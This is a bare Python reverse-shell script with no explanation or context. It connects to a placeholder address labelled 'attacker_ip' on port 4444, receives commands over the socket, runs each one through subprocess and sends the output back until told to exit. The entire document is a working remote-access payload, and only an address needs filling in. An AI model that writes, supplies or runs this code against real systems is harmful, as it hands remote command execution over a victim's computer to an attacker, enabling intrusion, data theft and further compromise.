import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker_ip", 4444))

while True:
    command = s.recv(1024).decode('utf-8')
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode('utf-8'))

s.close()
